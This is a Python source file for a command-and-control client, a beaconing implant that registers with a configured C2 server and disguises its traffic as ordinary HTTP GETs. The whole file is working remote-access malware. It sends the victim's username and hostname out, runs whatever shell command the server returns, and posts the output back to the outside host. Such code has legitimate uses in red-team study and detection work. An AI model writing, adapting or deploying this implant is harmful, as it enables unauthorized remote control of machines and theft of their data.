"""
c2-client.py: A lightweight beaconing agent that registers with a Command and Control (C2) 
server and checks for tasks by mimicking legitimate HTTP GET traffic.
"""
import requests
import os
import time
import subprocess
from settings import PROXY, PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, RESPONSE_PATH_KEY, DELAY, HEADER, CWD_RESPONSE

# For a Windows, Linux, or MacOS system, obtain unique identifier
# client = f"{os.getenv('USERNAME', 'unknown')}@{os.getenv('COMPUTERNAME', 'unknown')}-{time.time()}" # For Windows
client = f"{os.getenv('LOGNAME', 'unknown')}@{os.uname().nodename}-{time.time()}" # For Linux or MacOS

def post_to_server(message, response_path=RESPONSE_PATH):
    try:
        requests.post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_PATH_KEY: message}, headers=HEADER, proxies=PROXY)
    except requests.exceptions.RequestException:
        return


while True:
    try:
        # Send a beaconing request to the C2 server to register the client and check for pending instructions
        response = requests.get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)

        if response.status_code == 404:
            raise requests.exceptions.RequestException

    except requests.exceptions.RequestException:
        time.sleep(DELAY)
        continue

    command = response.content.decode()

    if command.startswith("cd "):
        directory = command[3:]
        try:
            os.chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You don't have permission to access f{directory}")
        except OSError:
            post_to_server("There was an error on the Operating System on the client")

    else:
        command_output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout
        post_to_server(message=command_output)